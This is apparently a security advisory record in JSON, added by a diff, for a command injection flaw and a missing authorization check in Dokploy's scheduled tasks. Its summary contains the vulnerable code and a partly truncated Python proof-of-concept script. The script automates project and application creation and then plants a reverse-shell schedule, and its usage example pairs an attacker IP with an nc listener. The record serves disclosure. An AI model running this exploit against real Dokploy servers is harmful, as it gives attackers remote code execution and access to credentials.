@@ -1,0 +1,50 @@
+{
+  "id": "GHSA-22pq-hhxw-773w",
+  "aliases": [],
+  "title": "Authenticated Remote Code Execution via Command Injection in Schedule Task",
+  "summary": "### Summary\r\nA critical command injection vulnerability in Dokploy's scheduled task execution allows authenticated attackers to\r\n  execute arbitrary commands within application containers. The `command` parameter in the schedule creation API is\r\n  directly interpolated into shell commands without sanitization, enabling attackers to break out of the intended\r\n  command context and execute malicious code. This can lead to complete container compromise, credential theft, and\r\n  potential host system access.\r\n\r\n### Details\r\n### 1. Command Injection (CWE-78)\r\n\r\n**Affected File**: `packages/server/src/utils/schedules/utils.ts` (Lines 80-81)\r\n\r\n```typescript\r\necho \"Running command: docker exec ${containerId} ${shellType} -c '${command}'\" >> ${deployment.logPath};\r\ndocker exec ${containerId} ${shellType} -c '${command}' >> ${deployment.logPath} 2>> ${deployment.logPath}\r\n```\r\n\r\nUser-supplied `command` is directly interpolated into shell commands without escaping.\r\n\r\n### 2. Missing Authorization Check (CWE-862)\r\n\r\n**Affected File**: `apps/dokploy/server/api/routers/schedule.ts` (Line 22)\r\n\r\n```typescript\r\ncreate: protectedProcedure  // Should be adminProcedure\r\n  .input(apiCreateSchedule)\r\n  .mutation(async ({ input, ctx }) => {\r\n    return await createSchedule(input);\r\n  }),\r\n```\r\n### PoC\r\n### One-Click Exploitation Script\r\n\r\n**Usage**:\r\n\r\n```bash\r\npython3 dokploy-rce-poc.py <target> <cookie> <attacker_ip> <attacker_port>\r\n```\r\n\r\n**Example**:\r\n\r\n```bash\r\n# Start listener first\r\nnc -lvvp 666\r\n\r\n# Run exploit\r\npython3 dokploy-rce-poc.py http://localhost:3000 \"your_cookie\" \"8.155.172.235\" \"666\"\r\n```\r\n\r\n### PoC Script (dokploy-rce-poc.py)\r\n\r\n```python\r\n#!/usr/bin/env python3\r\n\"\"\"\r\n\r\n\r\nThis script automatically:\r\n1. Creates a new project\r\n2. Creates a new application\r\n3. Configures Docker image (alpine:latest)\r\n4. Deploys the application\r\n5. Waits for container to start\r\n6. Creates reverse shell schedule\r\n7. Waits for connection\r\n\r\nUsage:\r\n  python3 dokploy-rce-poc.py <target> <cookie> <attacker_ip> <attacker_port>\r\n\r\nExamples:\r\n  python3 dokploy-rce-poc.py http://localhost:3000 \"cookie_value\" \"8.155.172.235\" \"666\"\r\n\r\nPrerequisites:\r\n  - Valid Dokploy session cookie\r\n  - nc listener on attacker server: nc -lvvp 666\r\n  - pip install requests\r\n\"\"\"\r\nimport sys\r\nimport time\r\nimport random\r\nimport string\r\ntry:\r\n    import requests\r\nexcept ImportError:\r\n    sys.exit(\"[!] Please install requests: pip install requests\")\r\n\r\ndef random_string(length=6):\r\n    return ''.join(random.choices(string.ascii_lowercase, k=length))\r\n\r\ndef create_project(target, headers):\r\n    \"\"\"Create a new project and get environment ID\"\"\"\r\n    name = f\"poc-{random_string()}\"\r\n    payload = {\"0\": {\"json\": {\"name\": name, \"description\": \"\", \"projectId\": \"\"}}}\r\n\r\n    resp = requests.post(\r\n        f\"{target}/api/trpc/project.create?batch=1\",\r\n        json=payload,\r\n        headers=headers,\r\n        timeout=10\r\n    )\r\n\r\n    if resp.status_code == 200:\r\n        data = resp.json()\r\n        result = data[0].get(\"result\", {}).get(\"data\", {}).get(\"json\", {})\r\n        project_id = result.get(\"project\", {}).get(\"projectId\")\r\n        env_id = result.get(\"environment\", {}).get(\"environmentId\")\r\n        return project_id, env_id, name\r\n\r\n    return None, None, None\r\n\r\ndef create_application(target, headers, env_id):\r\n    \"\"\"Create a new application\"\"\"\r\n    name = f\"app-{random_string()}\"\r\n    payload = {\r\n        \"0\": {\r\n            \"json\": {\r\n                \"name\": name,\r\n                \"appName\": name,\r\n                \"description\": \"\",\r\n                \"serverId\": None,\r\n                \"environmentId\": env_id\r\n            },\r\n            \"meta\": {\"values\": {\"serverId\": [\"undefined\"]}}\r\n        }\r\n    }\r\n\r\n    resp = requests.post(\r\n        f\"{target}/api/trpc/application.create?batch=1\",\r\n        json=payload,\r\n        headers=headers,\r\n        timeout=10\r\n    )\r\n\r\n    if resp.status_code == 200:\r\n        data = resp.json()\r\n        app_id = data[0].get(\"result\", {}).get(\"data\"...",
+  "published_at": "2026-11-12T08:17:53.000Z",
+  "modified_at": "2026-11-12T08:17:53.000Z",
+  "severity": {
+    "level": "critical",
+    "score": 9.4,
+    "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-78"
+  ],
+  "affected": [
+    {
+      "product": "dokploy",
+      "ranges": [
+        {
+          "introduced": "0",
+          "fixed": "0.29.13"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-22pq-hhxw-773w",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-22pq-hhxw-773w",
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-22pq-hhxw-773w",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:ba00b071f9b811cc127c45955ccd69f2dfc7f95688fde1740eceff3b35392821",
+  "note": null
+}
